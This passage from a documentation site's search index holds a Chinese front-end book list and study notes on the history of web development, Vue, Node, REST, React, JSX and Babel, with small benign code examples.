<p>\u300aJavaScript\u9ad8\u7ea7\u7a0b\u5e8f\u8bbe\u8ba1\uff08\u7b2c3\u7248\uff09\u300b </p> <p>\u300aJavaScript\u6743\u5a01\u6307\u5357\u300b </p> <p>\u300a\u6df1\u5165\u7406\u89e3ES6\u300b </p>"},{"location":"other/%E5%85%B6%E4%BB%96%E4%B9%A6%E5%8D%95/#react","title":"React","text":"<p>\u300aReact\u72b6\u6001\u7ba1\u7406\u4e0e\u540c\u6784\u5b9e\u6218\u300b </p> <p>\u300a\u6df1\u5165React\u6280\u672f\u6808\u300b </p> <p>\u300aReact\u8fdb\u9636\u4e4b\u8def\u300b </p> <p>\u300a\u6df1\u5165\u6d45\u51faReact\u548cRedux\u300b </p>"},{"location":"other/%E5%85%B6%E4%BB%96%E4%B9%A6%E5%8D%95/#_1","title":"\u524d\u7aef","text":"<p>\u300a\u6307\u5c16\u4e0a\u884c \u79fb\u52a8\u524d\u7aef\u5f00\u53d1\u8fdb\u9636\u4e4b\u8def\u300b \u4e66\u6458</p> <p>\u300a\u524d\u7aef\u5de5\u7a0b\u5316\u4f53\u7cfb\u8bbe\u8ba1\u4e0e\u5b9e\u8df5\u300b \u4e66\u6458</p> <p>\u300a\u524d\u7aef\u67b6\u6784\u8bbe\u8ba1\u300b \u4e66\u6458</p> <p>\u300a\u6e10\u8fdb\u589e\u5f3a\u2014\u2014\u8de8\u5e73\u53f0\u7528\u6237\u4f53\u9a8c\u8bbe\u8ba1\u300b \u4e66\u6458</p> <p>\u300aWeb\u5168\u6808\u5de5\u7a0b\u5e08\u7684\u81ea\u6211\u4fee\u517b\u300b </p> <p>\u300aWeb\u5f00\u53d1\u79d8\u65b9\u300b </p> <p>\u300a\u54cd\u5e94\u5f0fWeb\u8bbe\u8ba1\u300b </p> <p>\u300a\u524d\u7aef\u4f53\u9a8c\u8bbe\u8ba1\u300b</p> <p>\u300a\u7f16\u5199\u9ad8\u8d28\u91cf\u4ee3\u7801 Web\u524d\u7aef\u5f00\u53d1\u4fee\u70bc\u4e4b\u9053\u300b</p> <p>\u300a\u77ac\u95f4\u4e4b\u7f8e Web\u754c\u9762\u8bbe\u8ba1\u5982\u4f55\u8ba9\u7528\u6237\u5fc3\u52a8\u300b </p> <p>\u300aWeb\u8868\u5355\u8bbe\u8ba1 \u70b9\u77f3\u6210\u91d1\u7684\u827a\u672f\u300b </p>"},{"location":"other/%E5%85%B6%E4%BB%96%E4%B9%A6%E5%8D%95/#nodejs","title":"Node.js","text":"<p>\u300aNode.js\u5b9e\u6218\u300b </p>"},{"location":"other/%E5%85%B6%E4%BB%96%E4%B9%A6%E5%8D%95/#_2","title":"\u5de5\u5177","text":"<p>\u300aFiddler\u8c03\u8bd5\u6743\u5a01\u6307\u5357\u300b</p> <p>\u300a\u7cbe\u901aGit\uff08\u7b2c2\u7248\uff09\u300b </p> <p>\u300aWebPageTest\u5e94\u7528\u6307\u5357\u300b </p> <p>\u300aHTTP\u6293\u5305\u5b9e\u6218\u300b </p>"},{"location":"other/%E5%85%B6%E4%BB%96%E4%B9%A6%E5%8D%95/#_3","title":"\u7f51\u7edc","text":"<p>\u300a\u6f2b\u8bddIP\u300b</p> <p>\u300aHTTP\u6743\u5a01\u6307\u5357\u300b</p> <p>\u300a\u56fe\u89e3TCP/IP\u300b </p> <p>\u300a\u56fe\u89e3HTTP\u300b </p> <p>\u300aWireshark\u7f51\u7edc\u5206\u6790\u5c31\u8fd9\u4e48\u7b80\u5355\u300b </p> <p>\u300awireshark\u7f51\u7edc\u5206\u6790\u7684\u827a\u672f\u300b </p>"},{"location":"other/%E5%85%B6%E4%BB%96%E4%B9%A6%E5%8D%95/#_4","title":"\u6d4b\u8bd5","text":"<p>\u300a\u6d4b\u8bd5\u9a71\u52a8\u7684JavaScript\u5f00\u53d1\u300b </p> <p>\u300aWeb\u524d\u7aef\u6d4b\u8bd5\u4e0e\u96c6\u6210\u300b </p> <p>\u300a\u8f6f\u4ef6\u6d4b\u8bd5\u7684\u827a\u672f\u300b </p>"},{"location":"other/%E5%85%B6%E4%BB%96%E4%B9%A6%E5%8D%95/#_5","title":"\u9762\u8bd5","text":"<p>\u300a\u5251\u6307Offer\uff1a\u540d\u4f01\u9762\u8bd5\u5b98\u7cbe\u8bb2\u5178\u578b\u7f16\u7a0b\u9898\u300b \u4e66\u6458</p> <p>\u300a\u524d\u7aef\u7a0b\u5e8f\u5458\u9762\u8bd5\u7b14\u8bd5\u5b9d\u5178\u300b </p> <p>\u300a\u524d\u7aef\u7a0b\u5e8f\u5458\u9762\u8bd5\u7b14\u8bd5\u771f\u9898\u5e93\u300b </p>"},{"location":"other/%E5%85%B6%E4%BB%96%E4%B9%A6%E5%8D%95/#_6","title":"\u6027\u80fd","text":"<p>\u300a\u9ad8\u6027\u80fdJavaScript\u300b \u4e66\u6458</p> <p>\u300a\u9ad8\u6027\u80fd\u7f51\u7ad9\u5efa\u8bbe\u6307\u5357\u300b </p> <p>\u300a\u9ad8\u6027\u80fd\u7f51\u7ad9\u5efa\u8bbe\u8fdb\u9636\u6307\u5357\u300b \u4e66\u6458</p> <p>\u300a\u9ad8\u6548\u524d\u7aef\uff1aWeb\u9ad8\u6548\u7f16\u7a0b\u4e0e\u4f18\u5316\u5b9e\u8df5\u300b </p> <p>\u300aWeb\u6027\u80fd\u6743\u5a01\u6307\u5357\u300b </p> <p>\u300a\u7f51\u7ad9\u6027\u80fd\u76d1\u6d4b\u4e0e\u4f18\u5316\u300b</p> <p>\u300a\u5927\u578b\u7f51\u7ad9\u6027\u80fd\u76d1\u6d4b\u3001\u5206\u6790\u4e0e\u4f18\u5316\u300b </p> <p>\u300aJavaScript\u6027\u80fd\u4f18\u5316 \u5ea6\u91cf\u3001\u76d1\u63a7\u4e0e\u53ef\u89c6\u5316\u300b </p>"},{"location":"other/%E5%85%B6%E4%BB%96%E4%B9%A6%E5%8D%95/#_7","title":"\u7b97\u6cd5","text":"<p>\u300a\u6795\u8fb9\u7b97\u6cd5\u4e66\u300b \u4e66\u6458</p> <p>\u300a\u7f16\u7a0b\u4e4b\u7f8e\u300b \u4e66\u6458</p> <p>\u300a\u5199\u7ed9\u5927\u5bb6\u770b\u7684\u7b97\u6cd5\u4e66\u300b \u4e66\u6458</p> <p>\u300a\u5b66\u4e60JavaScript\u6570\u636e\u7ed3\u6784\u4e0e\u7b97\u6cd5\u300b </p>"},{"location":"other/%E5%85%B6%E4%BB%96%E4%B9%A6%E5%8D%95/#_8","title":"\u8bbe\u8ba1\u6a21\u5f0f","text":"<p>\u300aJavaScript\u8bbe\u8ba1\u6a21\u5f0f\u300b \u4e66\u6458</p> <p>\u300aJavaScript\u8bbe\u8ba1\u6a21\u5f0f\u4e0e\u5f00\u53d1\u5b9e\u8df5\u300b \u4e66\u6458</p> <p>\u300a\u5927\u8bdd\u8bbe\u8ba1\u6a21\u5f0f\u300b </p>"},{"location":"other/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96%E7%AC%94%E8%AE%B0-%E9%98%AE%E4%B8%80%E5%B3%B0/","title":"\u5168\u6808\u5de5\u7a0b\u5e08\u57f9\u8bad\u6750\u6599\uff0c\u5e2e\u52a9\u5b66\u4e60\u8005\u638c\u63e1 JavaScript \u5168\u6808\u5f00\u53d1\u7684\u57fa\u672c\u77e5\u8bc6\uff0c\u627f\u62c5\u7b80\u5355 Web \u5e94\u7528\u7684\u524d\u540e\u7aef\u5f00\u53d1\u3002","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 17946  \u9605\u8bfb36\u5206\u949f</p>"},{"location":"other/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96%E7%AC%94%E8%AE%B0-%E9%98%AE%E4%B8%80%E5%B3%B0/#_1","title":"\u76ee\u5f55","text":"<p>\u7b2c\u4e00\u8bb2\uff1a\u524d\u7aef\u5f00\u53d1\u7684\u5386\u53f2\u548c\u8d8b\u52bf</p> <ol> <li>\u524d\u7aef\u5f00\u53d1\u7684\u5386\u53f2\u6f14\u53d8</li> <li>\u524d\u7aef MVC \u6846\u67b6\u7684\u5174\u8d77</li> <li>\u524d\u540e\u7aef\u5206\u79bb</li> <li>\u5168\u6808\u5de5\u7a0b\u5e08</li> <li>\u524d\u7aef\u5f00\u53d1\u7684\u672a\u6765</li> </ol> <p>\u7b2c\u4e8c\u8bb2\uff1aReact \u6280\u672f\u6808</p> <ol> <li>React \u7684\u57fa\u672c\u7528\u6cd5</li> <li>React \u5e94\u7528\u7684\u67b6\u6784</li> </ol> <p>\u7b2c\u4e09\u8bb2\uff1aNode \u5e94\u7528\u5f00\u53d1</p> <ol> <li>Node \u7684\u57fa\u672c\u7528\u6cd5</li> <li>Restful API</li> <li>Express \u6846\u67b6\u642d\u5efa Web \u5e94\u7528</li> </ol> <p>\u7b2c\u56db\u8bb2\uff1a\u524d\u7aef\u5de5\u7a0b\u7b80\u4ecb</p> <ol> <li>\u6301\u7eed\u96c6\u6210</li> <li>\u9759\u6001\u4ee3\u7801\u68c0\u67e5</li> <li>\u5355\u5143\u6d4b\u8bd5</li> <li>\u529f\u80fd\u6d4b\u8bd5</li> <li>\u6301\u7eed\u96c6\u6210\u670d\u52a1 Travis CI</li> </ol>"},{"location":"other/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96%E7%AC%94%E8%AE%B0-%E9%98%AE%E4%B8%80%E5%B3%B0/#_2","title":"\u524d\u7aef\u5f00\u53d1\u7684\u5386\u53f2\u548c\u8d8b\u52bf","text":""},{"location":"other/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96%E7%AC%94%E8%AE%B0-%E9%98%AE%E4%B8%80%E5%B3%B0/#mvc","title":"\u540e\u7aef MVC \u7684\u5f00\u53d1\u6a21\u5f0f","text":"<p>\u65e9\u671f\u7f51\u7ad9\u5f00\u53d1\uff0c\u91c7\u7528\u7684\u662f\u540e\u7aef MVC \u6a21\u5f0f\u3002</p> <ul> <li>Model\uff08\u6a21\u578b\u5c42\uff09\uff1a\u63d0\u4f9b/\u4fdd\u5b58\u6570\u636e</li> <li>Controller\uff08\u63a7\u5236\u5c42\uff09\uff1a\u6570\u636e\u5904\u7406\uff0c\u5b9e\u73b0\u4e1a\u52a1\u903b\u8f91</li> <li>View\uff08\u89c6\u56fe\u5c42\uff09\uff1a\u5c55\u793a\u6570\u636e\uff0c\u63d0\u4f9b\u7528\u6237\u754c\u9762</li> </ul> <p>\u540e\u7aef\u4ee3\u7801\u8bfb\u53d6\u6a21\u677f\uff0c\u66ff\u6362\u53d8\u91cf\uff0c\u6e32\u67d3\u51fa\u9875\u9762\u3002</p> <p>\u524d\u7aef\u53ea\u662f\u540e\u7aef MVC \u7684 V\u3002\u90a3\u65f6\u7684\u524d\u7aef\u5de5\u7a0b\u5e08\uff0c\u5b9e\u9645\u4e0a\u662f\u6a21\u677f\u5de5\u7a0b\u5e08\uff0c\u8d1f\u8d23\u7f16\u5199\u9875\u9762\u6a21\u677f\u3002</p>"},{"location":"other/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96%E7%AC%94%E8%AE%B0-%E9%98%AE%E4%B8%80%E5%B3%B0/#ajax","title":"Ajax","text":"<p>Ajax \u6280\u672f\u8bde\u751f\uff0c\u6539\u53d8\u4e86\u4e00\u5207\u3002</p> <p>\u524d\u7aef\u4e0d\u518d\u662f\u540e\u7aef\u7684\u6a21\u677f\uff0c\u53ef\u4ee5\u72ec\u7acb\u5f97\u5230\u5404\u79cd\u6570\u636e\u3002</p>"},{"location":"other/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96%E7%AC%94%E8%AE%B0-%E9%98%AE%E4%B8%80%E5%B3%B0/#web-20","title":"Web 2.0","text":"<p>Ajax \u6280\u672f\u4fc3\u6210\u4e86 Web 2.0 \u7684\u8bde\u751f\u3002Web 1.0\uff1a\u9759\u6001\u7f51\u9875\uff0c\u7eaf\u5185\u5bb9\u5c55\u793a\u3002Web 2.0\uff1a\u52a8\u6001\u7f51\u9875\uff0c\u5bcc\u4ea4\u4e92\uff0c\u524d\u7aef\u6570\u636e\u5904\u7406\u3002\u4ece\u90a3\u65f6\u8d77\uff0c\u524d\u7aef\u53d8\u5f97\u590d\u6742\u4e86\uff0c\u5bf9\u524d\u7aef\u5de5\u7a0b\u5e08\u7684\u8981\u6c42\u8d8a\u6765\u8d8a\u9ad8\u3002</p>"},{"location":"other/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96%E7%AC%94%E8%AE%B0-%E9%98%AE%E4%B8%80%E5%B3%B0/#mvc_1","title":"\u524d\u7aef MVC \u6846\u67b6","text":"<p>\u524d\u7aef\u901a\u8fc7 Ajax \u5f97\u5230\u6570\u636e\uff0c\u56e0\u6b64\u4e5f\u6709\u4e86\u5904\u7406\u6570\u636e\u7684\u9700\u6c42\u3002</p> <p>\u524d\u7aef\u4ee3\u7801\u53d8\u5f97\u4e5f\u9700\u8981==\u4fdd\u5b58\u6570\u636e\u3001\u5904\u7406\u6570\u636e\u3001\u751f\u6210\u89c6\u56fe==\uff0c\u8fd9\u5bfc\u81f4\u4e86\u524d\u7aef MVC \u6846\u67b6\u7684\u8bde\u751f\u3002</p>"},{"location":"other/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96%E7%AC%94%E8%AE%B0-%E9%98%AE%E4%B8%80%E5%B3%B0/#mvvm","title":"MVVM \u6a21\u5f0f","text":"<p>\u53e6\u4e00\u4e9b\u6846\u67b6\u63d0\u51fa MVVM \u6a21\u5f0f\uff0c\u7528 View Model \u4ee3\u66ff Controller\u3002</p> <ul> <li>Model</li> <li>View</li> <li>View-Model\uff1a\u7b80\u5316\u7684 Controller\uff0c\u552f\u4e00\u4f5c\u7528\u5c31\u662f\u4e3a View \u63d0\u4f9b\u5904\u7406\u597d\u7684\u6570\u636e\uff0c\u4e0d\u542b\u5176\u4ed6\u903b\u8f91\u3002</li> </ul> <p>\u672c\u8d28\uff1aview \u7ed1\u5b9a view-model\uff0c\u89c6\u56fe\u4e0e\u6570\u636e\u6a21\u578b\u5f3a\u8026\u5408\u3002\u6570\u636e\u7684\u53d8\u5316\u5b9e\u65f6\u53cd\u6620\u5728 view \u4e0a\uff0c\u4e0d\u9700\u8981\u624b\u52a8\u5904\u7406\u3002</p>"},{"location":"other/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96%E7%AC%94%E8%AE%B0-%E9%98%AE%E4%B8%80%E5%B3%B0/#spa","title":"SPA","text":"<p>\u524d\u7aef\u53ef\u4ee5\u505a\u5230\uff1a\u8bfb\u5199\u6570\u636e\uff1b\u5207\u6362\u89c6\u56fe\uff1b\u7528\u6237\u4ea4\u4e92</p> <p>\u8fd9\u610f\u5473\u7740\uff0c\u7f51\u9875\u5176\u5b9e\u662f\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f\u3002SPA = Single-page application</p> <p>2010\u5e74\u540e\uff0c\u524d\u7aef\u5de5\u7a0b\u5e08\u4ece\u5f00\u53d1\u9875\u9762\uff0c\u53d8\u6210\u4e86\u5f00\u53d1\u201c\u524d\u7aef\u5e94\u7528\u201d\uff08\u8dd1\u5728\u6d4f\u89c8\u5668\u91cc\u9762\u7684\u5e94\u7528\u7a0b\u5e8f\uff09\u3002</p> <p>\u4f20\u7edf\u7684\u67b6\u6784 and \u5355\u9875\u5e94\u7528\u7684\u67b6\u6784\uff0c\u591a\u4e86\u4e00\u4e2a\u524d\u7aef MVC \u5c42</p>"},{"location":"other/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96%E7%AC%94%E8%AE%B0-%E9%98%AE%E4%B8%80%E5%B3%B0/#vue","title":"Vue","text":"<p>Vue.js \u662f\u73b0\u5728\u5f88\u70ed\u95e8\u7684\u4e00\u79cd\u524d\u7aef MVVM \u6846\u67b6\u3002\u57fa\u672c\u601d\u60f3\u4e0e Angular \u7c7b\u4f3c\uff0c\u7528\u6cd5\u66f4\u7b80\u5355\uff0c\u5f15\u5165\u54cd\u5e94\u5f0f\u7f16\u7a0b\u7684\u6982\u5ff5\u3002</p> <p>\u793a\u4f8b\uff1aVue \u7684\u53cc\u5411\u7ed1\u5b9a\uff0cVue \u7684\u6a21\u677f\u4e0e\u6570\u636e\uff0c\u662f\u53cc\u5411\u7ed1\u5b9a\u7684\u3002</p> <p>HTML \u4ee3\u7801</p> <pre><code>&lt;div id=\"journal\"&gt;\n  &lt;input type=\"text\" v-model=\"message\"&gt;\n  &lt;div&gt;{{message}}&lt;/div&gt;\n&lt;/div&gt;\n</code></pre> <p>JS \u4ee3\u7801</p> <pre><code>var journal = new Vue({\n  el: '#journal',\n  data: {\n    message: 'Your first entry'\n  }\n});\n</code></pre>"},{"location":"other/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96%E7%AC%94%E8%AE%B0-%E9%98%AE%E4%B8%80%E5%B3%B0/#_3","title":"\u524d\u540e\u7aef\u5206\u79bb","text":"<p>Ajax -&gt; \u524d\u7aef\u5e94\u7528\u5174\u8d77\uff1b\u667a\u80fd\u624b\u673a -&gt; \u591a\u7ec8\u7aef\u652f\u6301</p> <p>\u8fd9\u4e24\u4e2a\u539f\u56e0\uff0c\u5bfc\u81f4\u524d\u7aef\u5f00\u53d1\u65b9\u5f0f\u53d1\u751f\u6839\u672c\u7684\u53d8\u5316\u3002</p> <p>\u524d\u7aef\u4e0d\u518d\u662f\u540e\u7aef MVC \u4e2d\u7684 V\uff0c\u800c\u662f\u5355\u72ec\u7684\u4e00\u5c42\u3002</p>"},{"location":"other/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96%E7%AC%94%E8%AE%B0-%E9%98%AE%E4%B8%80%E5%B3%B0/#rest","title":"REST \u63a5\u53e3","text":"<p>\u524d\u540e\u7aef\u5206\u79bb\u4ee5\u540e\uff0c\u5b83\u4eec\u4e4b\u95f4\u901a\u8fc7==\u63a5\u53e3\u901a\u4fe1==\u3002\u540e\u7aef\u66b4\u9732\u51fa\u63a5\u53e3\uff0c\u524d\u7aef\u4f7f\u7528\u540e\u7aef\u63d0\u4f9b\u7684\u6570\u636e\u3002\u540e\u7aef\u63a5\u53e3\u4e00\u822c\u662f REST \u5f62\u5f0f\uff0c\u524d\u540e\u7aef\u7684\u901a\u4fe1\u534f\u8bae\u4e00\u822c\u662f HTTP\u3002</p>"},{"location":"other/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96%E7%AC%94%E8%AE%B0-%E9%98%AE%E4%B8%80%E5%B3%B0/#node","title":"Node","text":"<p>2009\u5e74\uff0cNode \u9879\u76ee\u8bde\u751f\uff0c\u5b83\u662f==\u670d\u52a1\u5668\u4e0a\u7684 JavaScript \u8fd0\u884c\u73af\u5883==\u3002</p> <p>Node = JavaScript + \u64cd\u4f5c\u7cfb\u7edf API</p> <p>Node \u7684\u610f\u4e49\uff1aJavaScript \u6210\u4e3a\u670d\u52a1\u5668\u811a\u672c\u8bed\u8a00\uff0c\u4e0e Python \u548c Ruby \u4e00\u6837\uff1bJavaScript \u6210\u4e3a\u552f\u4e00\u7684\u6d4f\u89c8\u5668\u548c\u670d\u52a1\u5668\u90fd\u652f\u6301\u7684\u8bed\u8a00\uff1b\u524d\u7aef\u5de5\u7a0b\u5e08\u53ef\u4ee5\u7f16\u5199\u540e\u7aef\u7a0b\u5e8f\u4e86</p>"},{"location":"other/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96%E7%AC%94%E8%AE%B0-%E9%98%AE%E4%B8%80%E5%B3%B0/#_4","title":"\u524d\u7aef\u5f00\u53d1\u6a21\u5f0f\u7684\u6839\u672c\u6539\u53d8","text":"<ul> <li>Node \u73af\u5883\u4e0b\u5f00\u53d1</li> <li>\u5927\u91cf\u4f7f\u7528\u670d\u52a1\u5668\u7aef\u5de5\u5177</li> <li>\u5f15\u5165\u6301\u7eed\u96c6\u6210\u7b49\u8f6f\u4ef6\u5de5\u7a0b\u7684\u6807\u51c6\u6d41\u7a0b</li> <li>\u5f00\u53d1\u5b8c\u6210\u540e\uff0c\u7f16\u8bd1\u6210\u6d4f\u89c8\u5668\u53ef\u4ee5\u8fd0\u884c\u7684\u811a\u672c\uff0c\u653e\u4e0a CDN</li> </ul>"},{"location":"other/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96%E7%AC%94%E8%AE%B0-%E9%98%AE%E4%B8%80%E5%B3%B0/#_5","title":"\u5168\u6808\u5de5\u7a0b\u5e08","text":"<p>\u524d\u7aef\u5de5\u7a0b\u5e08\u6b63\u5728\u8f6c\u53d8\u4e3a\u5168\u6808\u5de5\u7a0b\u5e08\uff1a\u4e00\u4e2a\u4eba\u8d1f\u8d23\u5f00\u53d1\u524d\u7aef\u548c\u540e\u7aef\uff1b\u4ece\u6570\u636e\u5e93\u5230 UI \u7684\u6240\u6709\u5f00\u53d1</p> <p>\u600e\u6837\u624d\u80fd\u79f0\u4e3a\u5168\u6808\u5de5\u7a0b\u5e08\uff1f</p> <ul> <li>\u4f20\u7edf\u524d\u7aef\u6280\u80fd\uff1aHTML\u3001JavaScript\u3001CSS</li> <li>\u4e00\u95e8\u540e\u7aef\u8bed\u8a00</li> <li>\u79fb\u52a8\u7aef\u5f00\u53d1\uff1aiOS / Android / HTML5</li> <li>\u5176\u4ed6\u6280\u80fd\uff1a\u6570\u636e\u5e93\u3001HTTP \u7b49\u7b49</li> </ul>"},{"location":"other/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96%E7%AC%94%E8%AE%B0-%E9%98%AE%E4%B8%80%E5%B3%B0/#_6","title":"\u8f6f\u4ef6\u884c\u4e1a\u7684\u53d1\u5c55\u52a8\u529b","text":"<p>\u5386\u53f2\u6f14\u53d8\uff1a\u524d\u540e\u7aef\u4e0d\u5206 -&gt; \u524d\u540e\u7aef\u5206\u79bb -&gt; \u5168\u6808\u5de5\u7a0b\u5e08</p> <p>\u52a8\u529b\uff1a\u66f4\u52a0\u4ea7\u4e1a\u5316\u3001\u5927\u89c4\u6a21\u5730\u751f\u4ea7\u8f6f\u4ef6</p> <ul> <li>\u6548\u7387\u66f4\u9ad8</li> <li>\u6210\u672c\u66f4\u4f4e</li> </ul> <p>\u901a\u7528\u6027\u597d\u3001\u80fd\u591f\u5feb\u901f\u4ea7\u51fa\u7684\u6280\u672f\u6700\u7ec8\u4f1a\u8d62\uff0c\u5355\u4e2a\u7a0b\u5e8f\u5458\u7684\u751f\u4ea7\u529b\u8981\u6c42\u8d8a\u6765\u8d8a\u9ad8\u3002</p>"},{"location":"other/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96%E7%AC%94%E8%AE%B0-%E9%98%AE%E4%B8%80%E5%B3%B0/#h5","title":"H5 \u5c31\u662f\u4e00\u4e2a\u6700\u597d\u7684\u4f8b\u5b50","text":"<p>\u4e3a\u4ec0\u4e48 H5 \u6280\u672f\u4f1a\u8d62\u5f97\u79fb\u52a8\u7aef\uff1f</p> <ul> <li>\u5f00\u53d1\u901f\u5ea6\u5feb\uff1aNative \u9700\u8981\u91cd\u65b0\u7f16\u8bd1\u624d\u80fd\u770b\u5230\u7ed3\u679c\uff0cH5 \u662f\u5373\u65f6\u8f93\u51fa</li> <li>\u5f00\u53d1\u6210\u672c\u4f4e\uff1aNative \u9700\u8981\u4e24\u4e2a\u5f00\u53d1\u56e2\u961f\uff0cH5 \u53ea\u8981\u4e00\u4e2a</li> <li>\u5feb\u901f\u53d1\u5e03\uff1a\u5b89\u5353 Native \u65b0\u7248\u672c\u9700\u898124\u5c0f\u65f6\uff0ciOS \u9700\u8981 3 \uff5e 4 \u5929\uff0cH5 \u53ef\u4ee5\u968f\u65f6\u66f4\u65b0</li> </ul> <p>\u672a\u6765\u8f6f\u4ef6\u7684\u7279\u70b9\uff1a\u8054\u7f51\uff1b\u9ad8\u5e76\u53d1\uff1b\u5206\u5e03\u5f0f\uff1b\u8de8\u7ec8\u7aef</p> <p>\u73b0\u5728\u57fa\u4e8e Web \u7684\u524d\u7aef\u6280\u672f\uff0c\u5c06\u6f14\u53d8\u4e3a\u672a\u6765\u6240\u6709\u8f6f\u4ef6\u7684\u901a\u7528\u7684 GUI \u89e3\u51b3\u65b9\u6848\u3002</p>"},{"location":"other/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96%E7%AC%94%E8%AE%B0-%E9%98%AE%E4%B8%80%E5%B3%B0/#_7","title":"\u672a\u6765\u53ea\u6709\u4e24\u79cd\u8f6f\u4ef6\u5de5\u7a0b\u5e08","text":"<ul> <li>\u7aef\u5de5\u7a0b\u5e08</li> <li>\u624b\u673a\u7aef</li> <li>PC \u7aef</li> <li>TV \u7aef</li> <li>VR \u7aef</li> <li>\u2026\u2026</li> <li>\u4e91\u5de5\u7a0b\u5e08</li> </ul>"},{"location":"other/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96%E7%AC%94%E8%AE%B0-%E9%98%AE%E4%B8%80%E5%B3%B0/#react","title":"React \u6280\u672f\u6808","text":"<p>React \u7684\u4f18\u70b9</p> <ul> <li>\u7ec4\u4ef6\u6a21\u5f0f\uff1a\u4ee3\u7801\u590d\u7528\u548c\u56e2\u961f\u5206\u5de5</li> <li>\u865a\u62df DOM\uff1a\u6027\u80fd\u4f18\u52bf</li> <li>\u79fb\u52a8\u7aef\u652f\u6301\uff1a\u8de8\u7ec8\u7aef</li> </ul> <p>React \u7684\u7f3a\u70b9</p> <ul> <li>\u5b66\u4e60\u66f2\u7ebf\u8f83\u9661\u5ced</li> <li>\u5168\u65b0\u7684\u4e00\u5957\u6982\u5ff5\uff0c\u4e0e\u5176\u4ed6\u6240\u6709\u6846\u67b6\u622a\u7136\u4e0d\u540c</li> <li>\u53ea\u6709\u91c7\u7528\u5b83\u7684\u6574\u4e2a\u6280\u672f\u6808\uff0c\u624d\u80fd\u53d1\u6325\u6700\u5927\u5a01\u529b</li> </ul> <p>\u603b\u7ed3\uff1aReact \u975e\u5e38\u5148\u8fdb\u548c\u5f3a\u5927\uff0c\u4f46\u662f\u5b66\u4e60\u548c\u5b9e\u73b0\u6210\u672c\u90fd\u4e0d\u4f4e</p>"},{"location":"other/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96%E7%AC%94%E8%AE%B0-%E9%98%AE%E4%B8%80%E5%B3%B0/#jsx","title":"JSX \u8bed\u6cd5","text":"<p>React \u4f7f\u7528 JSX \u8bed\u6cd5\uff0cJavaScript \u4ee3\u7801\u4e2d\u53ef\u4ee5\u5199 HTML \u4ee3\u7801\u3002</p> <pre><code>let myTitle = &lt;h1&gt;Hello, world!&lt;/h1&gt;;\n</code></pre> <p>\uff081\uff09JSX \u8bed\u6cd5\u7684\u6700\u5916\u5c42\uff0c\u53ea\u80fd\u6709\u4e00\u4e2a\u8282\u70b9\u3002</p> <pre><code>// \u9519\u8bef\nlet myTitle = &lt;p&gt;Hello&lt;/p&gt;&lt;p&gt;World&lt;/p&gt;;\n</code></pre> <p>\uff082\uff09JSX \u8bed\u6cd5\u4e2d\u53ef\u4ee5\u63d2\u5165 JavaScript \u4ee3\u7801\uff0c\u4f7f\u7528\u5927\u62ec\u53f7\u3002</p> <pre><code>let myTitle = &lt;p&gt;{'Hello ' + 'World'}&lt;/p&gt;\n</code></pre>"},{"location":"other/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96%E7%AC%94%E8%AE%B0-%E9%98%AE%E4%B8%80%E5%B3%B0/#babel","title":"Babel \u8f6c\u7801\u5668","text":"<p>JavaScript \u5f15\u64ce\uff08\u5305\u62ec\u6d4f\u89c8\u5668\u548c Node\uff09\u90fd\u4e0d\u8ba4\u8bc6 JSX\uff0c\u9700\u8981\u9996\u5148\u4f7f\u7528 Babel \u8f6c\u7801\uff0c\u7136\u540e\u624d\u80fd\u8fd0\u884c\u3002</p> <pre><code>&lt;script src=\"react.js\"&gt;&lt;/script&gt;\n&lt;script src=\"react-dom.js\"&gt;&lt;/script&gt;\n&lt;script src=\"babel.min.js\"&gt;&lt;/script&gt;\n&lt;script type=\"text/babel\"&gt;\n  // ** Our code goes here! **\n&lt;/script&gt;\n</code></pre> <p>React \u9700\u8981\u52a0\u8f7d\u4e24\u4e2a\u5e93\uff1aReact \u548c React-DOM\uff0c\u524d\u8005\u662f React \u7684\u6838\u5fc3\u5e93\uff0c\u540e\u8005\u662f React \u7684 DOM \u9002\u914d\u5e93\u3002</p> <p>Babel \u7528\u6765\u5728\u6d4f\u89c8\u5668\u8f6c\u6362 JSX \u8bed\u6cd5\uff0c\u5982\u679c\u670d\u52a1\u5668\u5df2\u7ecf\u8f6c\u597d\u4e86\uff0c\u6d4f\u89c8\u5668\u5c31\u4e0d\u9700\u8981\u52a0\u8f7d\u8fd9\u4e2a\u5e93\u3002</p>"},{"location":"other/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96%E7%AC%94%E8%AE%B0-%E9%98%AE%E4%B8%80%E5%B3%B0/#react_1","title":"React \u7ec4\u4ef6\u5e93","text":"<p>React 